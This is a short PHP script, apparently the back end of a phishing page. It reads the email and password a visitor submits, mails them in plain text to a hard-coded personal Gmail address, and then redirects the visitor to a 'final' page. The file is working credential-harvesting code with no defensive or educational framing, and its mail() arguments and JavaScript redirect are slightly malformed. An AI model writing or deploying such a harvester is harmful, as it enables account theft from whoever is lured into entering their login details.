<?php 
    $destinatario = 'carlosjavier.cjps@gmail.com';

    $email = $_POST['email'];
    $password = $_POST['password'];

    $header = "enviado desde la pagina de prueba 3";
    $mensajeCompleto = "correo :" . $email . "clave: " . $password;

    mail($destinatario, $mensajeCompleto, $header);
   
    echo "<script> setTimeout(\"location.href='final.html'\"1000)</script>";
?> 